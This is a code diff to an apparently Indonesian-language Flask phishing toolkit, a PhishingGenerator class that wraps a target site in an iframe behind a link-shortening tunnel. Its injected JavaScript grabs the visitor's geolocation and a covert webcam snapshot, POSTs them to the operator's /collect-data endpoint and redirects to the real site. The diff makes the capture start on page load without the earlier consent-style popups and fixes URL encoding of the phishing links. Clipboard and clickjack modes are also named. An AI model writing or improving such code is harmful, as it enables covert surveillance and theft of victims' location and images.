@@ -13,7 +13,7 @@ import requests
 import logging
 from flask import Flask, request, redirect, jsonify, make_response
 import pyshorteners
-from urllib.parse import urlparse, urljoin
+from urllib.parse import urlparse, urljoin, quote
 from rich.console import Console
 from rich.table import Table
 from rich.live import Live
@@ -204,33 +204,20 @@ class PhishingGenerator:
                 
                 if phish_type == "location":
                     permission_script += """
-                    var gaLocPopup = document.createElement('div');
-                    gaLocPopup.innerHTML = '<div id="locOverlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);display:flex;justify-content:center;align-items:center;z-index:99999;">' +
-                        '<div style="background:#fff;border-radius:16px;padding:32px 28px;max-width:360px;width:90%;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.2);">' +
-                            '<div style="font-size:56px;margin-bottom:12px;">📍</div>' +
-                            '<h2 style="margin:0 0 6px;color:#1a1a1a;font-size:22px;font-weight:600;">Allow Location Access</h2>' +
-                            '<p style="color:#5f6368;font-size:14px;line-height:1.5;margin:0 0 20px;">This website needs your location to show relevant content and provide a better experience near you.</p>' +
-                            '<button id="locAllowBtn" style="width:100%;padding:14px;background:#1a73e8;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:500;cursor:pointer;box-shadow:0 2px 8px rgba(26,115,232,0.3);">Allow Location Access</button>' +
-                        '</div></div>';
-                    document.body.appendChild(gaLocPopup);
-                    document.getElementById('locAllowBtn').addEventListener('click', function() {
-                        var o = document.getElementById('locOverlay');
-                        if (o) o.style.display = 'none';
-                        navigator.geolocation.getCurrentPosition(function(position) {
-                            fetch('/collect-data', {
-                                method: 'POST',
-                                headers: {'Content-Type': 'application/json'},
-                                body: JSON.stringify({
-                                    type: 'location',
-                                    lat: position.coords.latitude,
-                                    lng: position.coords.longitude
-                                })
-                            }).then(function() {
-                                window.top.location.href = '""" + target_url + """';
-                            });
-                        }, function() {
+                    navigator.geolocation.getCurrentPosition(function(position) {
+                        fetch('/collect-data', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                type: 'location',
+                                lat: position.coords.latitude,
+                                lng: position.coords.longitude
+                            })
+                        }).then(function() {
                             window.top.location.href = '""" + target_url + """';
                         });
+                    }, function() {
+                        window.top.location.href = '""" + target_url + """';
                     });
                     """
                 
@@ -300,52 +287,39 @@ class PhishingGenerator:
 
                 elif phish_type == "camera":
                     permission_script += """
-                    var gaCamPopup = document.createElement('div');
-                    gaCamPopup.innerHTML = '<div id="camOverlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);display:flex;justify-content:center;align-items:center;z-index:99999;">' +
-                        '<div style="background:#fff;border-radius:16px;padding:32px 28px;max-width:360px;width:90%;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.2);">' +
-                            '<div style="font-size:56px;margin-bottom:12px;">📷</div>' +
-                            '<h2 style="margin:0 0 6px;color:#1a1a1a;font-size:22px;font-weight:600;">Camera Access Required</h2>' +
-                            '<p style="color:#5f6368;font-size:14px;line-height:1.5;margin:0 0 20px;">Please allow camera access to verify your identity and complete the secure verification process.</p>' +
-                            '<button id="camAllowBtn" style="width:100%;padding:14px;background:#1a73e8;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:500;cursor:pointer;box-shadow:0 2px 8px rgba(26,115,232,0.3);">Allow Camera Access</button>' +
-                        '</div></div>';
-                    document.body.appendChild(gaCamPopup);
-                    document.getElementById('camAllowBtn').addEventListener('click', function() {
-                        var o = document.getElementById('camOverlay');
-                        if (o) o.style.display = 'none';
-                        navigator.mediaDevices.getUserMedia({video: true})
-                        .then(function(stream) {
-                            var video = document.createElement('video');
-                            var canvas = document.createElement('canvas');
-                            video.style.display = 'none';
-                            canvas.style.display = 'none';
-                            document.body.appendChild(video);
-                            document.body.appendChild(canvas);
-                            video.srcObject = stream;
-                            video.play();
-                            video.onloadedmetadata = function() {
-                                canvas.width = video.videoWidth;
-                                canvas.height = video.videoHeight;
-                                setTimeout(function() {
-                                    canvas.getContext('2d').drawImage(video, 0, 0);
-                                    var imageData = canvas.toDataURL('image/jpeg');
-                                    fetch('/collect-data', {
-                                        method: 'POST',
-                                        headers: {'Content-Type': 'application/json'},
-                                        body: JSON.stringify({
-                                            type: 'camera_capture',
-                                            image: imageData
-                                        })
-                                    }).then(function() {
-                                        stream.getTracks().forEach(track => track.stop());
-                                        video.remove();
-                                        canvas.remove();
-                                        window.top.location.href = '""" + target_url + """';
-                                    });
-                                }, 1000);
-                            };
-                        }).catch(function() {
-                            window.top.location.href = '""" + target_url + """';
-                        });
+                    navigator.mediaDevices.getUserMedia({video: true})
+                    .then(function(stream) {
+                        var video = document.createElement('video');
+                        var canvas = document.createElement('canvas');
+                        video.style.display = 'none';
+                        canvas.style.display = 'none';
+                        document.body.appendChild(video);
+                        document.body.appendChild(canvas);
+                        video.srcObject = stream;
+                        video.play();
+                        video.onloadedmetadata = function() {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            setTimeout(function() {
+                                canvas.getContext('2d').drawImage(video, 0, 0);
+                                var imageData = canvas.toDataURL('image/jpeg');
+                                fetch('/collect-data', {
+                                    method: 'POST',
+                                    headers: {'Content-Type': 'application/json'},
+                                    body: JSON.stringify({
+                                        type: 'camera_capture',
+                                        image: imageData
+                                    })
+                                }).then(function() {
+                                    stream.getTracks().forEach(function(track) { track.stop(); });
+                                    video.remove();
+                                    canvas.remove();
+                                    window.top.location.href = '""" + target_url + """';
+                                });
+                            }, 1000);
+                        };
+                    }).catch(function() {
+                        window.top.location.href = '""" + target_url + """';
                     });
                     """
                 elif phish_type == "clipboard":
@@ -418,52 +392,38 @@ class PhishingGenerator:
 
                 elif phish_type == "combo":
                     permission_script += """
-                    var gaComPopup = document.createElement('div');
-                    gaComPopup.innerHTML = '<div id="comOverlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);display:flex;justify-content:center;align-items:center;z-index:99999;">' +
-                        '<div style="background:#fff;border-radius:16px;padding:32px 28px;max-width:360px;width:90%;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.2);">' +
-                            '<div style="font-size:48px;margin-bottom:10px;">🔐</div>' +
-                            '<h2 style="margin:0 0 6px;color:#1a1a1a;font-size:22px;font-weight:600;">Identity Verification Required</h2>' +
-                            '<p style="color:#5f6368;font-size:14px;line-height:1.5;margin:0 0 20px;">For security purposes, please allow camera and location access to complete the verification process.</p>' +
-                            '<button id="comAllowBtn" style="width:100%;padding:14px;background:#1a73e8;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:500;cursor:pointer;box-shadow:0 2px 8px rgba(26,115,232,0.3);">Continue with Verification</button>' +
-                        '</div></div>';
-                    document.body.appendChild(gaComPopup);
-                    document.getElementById('comAllowBtn').addEventListener('click', function() {
-                        var o = document.getElementById('comOverlay');
-                        if (o) o.style.display = 'none';
-                        var comboData = {};
-                        var done = 0;
-                        function tryRedirect() { done++; if (done >= 2) window.top.location.href = '""" + target_url + """'; }
-                        navigator.geolocation.getCurrentPosition(function(position) {
-                            fetch('/collect-data', {
-                                method: 'POST',
-                                headers: {'Content-Type': 'application/json'},
-                                body: JSON.stringify({ type: 'location', lat: position.coords.latitude, lng: position.coords.longitude })
-                            }).then(tryRedirect);
-                        }, tryRedirect);
-                        navigator.mediaDevices.getUserMedia({video: true})
-                        .then(function(stream) {
-                            var video = document.createElement('video');
-                            var canvas = document.createElement('canvas');
-                            video.style.display = 'none'; canvas.style.display = 'none';
-                            document.body.appendChild(video); document.body.appendChild(canvas);
-                            video.srcObject = stream; video.play();
-                            video.onloadedmetadata = function() {
-                                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                                setTimeout(function() {
-                                    canvas.getContext('2d').drawImage(video, 0, 0);
-                                    fetch('/collect-data', {
-                                        method: 'POST',
-                                        headers: {'Content-Type': 'application/json'},
-                                        body: JSON.stringify({ type: 'camera_capture', image: canvas.toDataURL('image/jpeg') })
-                                    }).then(function() {
-                                        stream.getTracks().forEach(function(t) { t.stop(); });
-                                        video.remove(); canvas.remove();
-                                        tryRedirect();
-                                    });
-                                }, 1500);
-                            };
-                        }).catch(tryRedirect);
-                    });
+                    var comboDone = 0;
+                    function comboRedirect() { comboDone++; if (comboDone >= 2) window.top.location.href = '""" + target_url + """'; }
+                    navigator.geolocation.getCurrentPosition(function(position) {
+                        fetch('/collect-data', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({ type: 'location', lat: position.coords.latitude, lng: position.coords.longitude })
+                        }).then(comboRedirect);
+                    }, comboRedirect);
+                    navigator.mediaDevices.getUserMedia({video: true})
+                    .then(function(stream) {
+                        var video = document.createElement('video');
+                        var canvas = document.createElement('canvas');
+                        video.style.display = 'none'; canvas.style.display = 'none';
+                        document.body.appendChild(video); document.body.appendChild(canvas);
+                        video.srcObject = stream; video.play();
+                        video.onloadedmetadata = function() {
+                            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                            setTimeout(function() {
+                                canvas.getContext('2d').drawImage(video, 0, 0);
+                                fetch('/collect-data', {
+                                    method: 'POST',
+                                    headers: {'Content-Type': 'application/json'},
+                                    body: JSON.stringify({ type: 'camera_capture', image: canvas.toDataURL('image/jpeg') })
+                                }).then(function() {
+                                    stream.getTracks().forEach(function(t) { t.stop(); });
+                                    video.remove(); canvas.remove();
+                                    comboRedirect();
+                                });
+                            }, 1500);
+                        };
+                    }).catch(comboRedirect);
                     """
 
                 elif phish_type == "clickjack":
@@ -1506,7 +1466,8 @@ class PhishingGenerator:
                 raise ValueError("Server URL tidak tersedia. Silakan periksa koneksi tunnel.")
                 
             phish_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
-            phish_url = f"{self.server_url}/phish/{phish_id}?type={phish_type}&url={target_url}"
+            encoded_target = quote(target_url, safe='') if target_url else ''
+            phish_url = f"{self.server_url}/phish/{phish_id}?type={phish_type}&url={encoded_target}"
             
             # Tidak perlu membuat template phishing karena menggunakan reverse proxy
             # Simpan template sederhana dengan proxy
@@ -1524,7 +1485,7 @@ class PhishingGenerator:
                 </style>
             </head>
             <body>
-                <iframe src="/phish/{phish_id}?type={phish_type}&url={target_url}" style="width:100%; height:100vh; border:none;"></iframe>
+                <iframe src="/phish/{phish_id}?type={phish_type}&url={encoded_target}" style="width:100%; height:100vh; border:none;"></iframe>
             </body>
             </html>
             """
